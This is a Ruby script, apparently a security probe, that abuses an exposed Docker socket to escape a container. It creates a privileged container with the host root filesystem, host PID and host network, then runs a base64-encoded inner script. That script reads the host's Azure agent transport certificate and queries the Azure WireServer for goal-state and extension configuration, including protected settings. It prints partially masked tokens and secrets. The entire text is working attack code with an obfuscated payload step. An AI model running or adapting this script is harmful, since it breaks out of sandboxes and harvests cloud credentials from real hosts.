require 'socket'
require 'json'

puts "VX_EXEC_UID=#{`id -u`.strip}"

def dapi(method, path, body = nil)
  s = UNIXSocket.new('/var/run/docker.sock')
  b = body ? JSON.generate(body) : ''
  s.write("#{method} #{path} HTTP/1.1\r\nHost: docker\r\nConnection: close\r\nContent-Type: application/json\r\nContent-Length: #{b.bytesize}\r\n\r\n#{b}")
  buf = +''
  begin
    loop { buf << s.readpartial(8192) }
  rescue EOFError, IOError
  end
  s.close
  hdr, _, pl = buf.partition("\r\n\r\n")
  if hdr =~ /chunked/i
    out = +''; i = 0
    while i < pl.bytesize
      j = pl.index("\r\n", i); break unless j
      n = pl[i...j].to_i(16); break if n.zero?
      out << pl[j + 2, n]; i = j + 2 + n + 2
    end
    pl = out
  end
  [hdr[/\d{3}/].to_i, pl]
rescue => e
  [-1, "ERR #{e.class}: #{e.message[0, 120]}"]
end

inner = <<'RUBY'
require 'net/http'
require 'json'
require 'base64'

HOST = '/host'

def mask_blobs(s)
  s.gsub(/[A-Za-z0-9+\/=\r\n]{400,}/) do |m|
    t = m.gsub(/\s/, '')
    "#{t[0, 60]}...(b64len=#{t.length})"
  end
end

def mask_secrets(s)
  s.gsub(/("[^"]*(?:token|privatekey|secret|password|accesskey|signature)[^"]*"\s*:\s*")([^"]*)(")/i) do
    "#{$1}#{$2[0, 8]}...(len=#{$2.length})#{$3}"
  end
end

der = `openssl x509 -in #{HOST}/var/lib/waagent/TransportCert.pem -outform DER 2>/dev/null`
CERT_B64 = der.empty? ? nil : Base64.strict_encode64(der)
HDRS = { 'x-ms-version' => '2015-04-05' }
HDRS['x-ms-guest-agent-public-x509-cert'] = CERT_B64 if CERT_B64

def http_get(host, port, path, headers = {})
  h = Net::HTTP.new(host, port)
  h.open_timeout = 4
  h.read_timeout = 8
  req = Net::HTTP::Get.new(path)
  headers.each { |k, v| req[k] = v }
  r = h.request(req)
  [r.code.to_s, r.body.to_s]
rescue => e
  ["ERR", "#{e.class}: #{e.message[0, 100]}"]
end

c, gs = http_get('168.63.129.16', 80, '/machine/?comp=goalstate', HDRS)
puts "VX_WS goalstate -> #{c} len=#{gs.bytesize}"

# extract every goalstate-embedded URL: <Tag>url</Tag> where url hits wireserver
found = gs.scan(/<([A-Za-z]+)>([^<]*168\.63\.129\.16[^<]*)<\/[A-Za-z]+>/)
found.each { |tag, u| puts "VX_GS_URL #{tag} = #{u.gsub('&amp;', '&')}" }

found.each do |tag, u|
  url = u.gsub('&amp;', '&')
  uri = URI.parse(url) rescue nil
  next unless uri
  cc, bb = http_get(uri.host, uri.port, "#{uri.path}?#{uri.query}", HDRS)
  lim = tag =~ /Extensions/i ? 3800 : 1200
  puts "VX_FETCH #{tag} -> #{cc} len=#{bb.bytesize}"
  puts "VX_FETCH_#{tag.upcase}_BODY #{mask_blobs(mask_secrets(bb))[0, lim].inspect}"
  puts "VX_FETCH_#{tag.upcase}_PROT=#{bb =~ /protectedSettings/i ? 'YES' : 'no'}"
end
puts 'VX_INNER_DONE'
RUBY

inner_b64 = [inner].pack('m0')
cmd = "echo #{inner_b64} | base64 -d > /tmp/i.rb && ruby /tmp/i.rb 2>&1"

create_body = {
  Image: 'ghcr.io/actions/jekyll-build-pages:v1.0.13',
  Tty: true,
  Entrypoint: ['bash', '-c'],
  Cmd: [cmd],
  HostConfig: {
    Binds: ['/:/host'],
    PidMode: 'host',
    NetworkMode: 'host',
    Privileged: true
  }
}

code, body = dapi('POST', '/containers/create', create_body)
puts "VX_CREATE code=#{code} #{body[0, 300]}"
cid = (JSON.parse(body)['Id'] rescue nil)
if cid
  c2, b2 = dapi('POST', "/containers/#{cid}/start")
  puts "VX_START code=#{c2} #{b2[0, 200]}"
  c3, b3 = dapi('POST', "/containers/#{cid}/wait")
  puts "VX_WAIT code=#{c3} #{b3[0, 200]}"
  c4, logs = dapi('GET', "/containers/#{cid}/logs?stdout=1&stderr=1")
  puts "VX_LOGS code=#{c4}"
  scrub = logs.gsub(/[^[:print:]\n]/, '')
  puts 'VX_ESC_BEGIN'
  puts scrub[0, 14000]
  puts 'VX_ESC_END'
  c5, b5 = dapi('DELETE', "/containers/#{cid}?force=true")
  puts "VX_DEL code=#{c5}"
else
  puts 'VX_NO_CONTAINER'
end
